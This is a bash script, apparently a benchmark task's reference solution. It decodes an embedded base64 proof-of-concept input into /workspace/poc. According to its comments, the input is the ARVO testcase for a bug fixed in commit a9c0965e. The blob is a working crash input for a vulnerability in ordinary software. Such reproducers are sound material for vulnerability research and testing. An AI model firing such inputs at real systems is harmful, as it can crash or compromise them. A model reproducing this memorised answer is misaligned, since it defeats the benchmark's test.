#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit a9c0965e addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
LnByaW9yaXR5KFtbyykiMiIiMCIi/ycraW5mXHUwMDAwXHJcblx1MDAwMCQrISEkJyH//4db//86//8v1f+np6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp46nIiL///+HW///Ov//L9X/p6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6dPWFhYp6enp6enp6enp6enp6enp6enp6enp6enItV5AAAAAP8gMAAxIDQzMTgxODYwNTU1ODAxKS8gQApqOgpbW1tbW1tbW1tbA+hbW1tbW1tbW1tbW6WkpKSkW1tbW1tdW1tbW1tbW1tbW1ulpKSkpFtbW1tbXVtbW1tbW1tbW1tbpaSkpKSkpJtbW1tbW1tbW1tbW1tbWwtbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tTW1tbW1sAAAAAW1tbW1tbC1tbW1tbW1tbW1tbW1tbW1t7aSBfAC5pbmhlcml0ICIwIiLsItUK//3///7/ajp7aSB0AC5pbmhlcml0ICIxIiLsItUK//3/////ajp7LmluaGVyaXQgIjEiIuwi1Qr//f////9qOntpIHQA
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
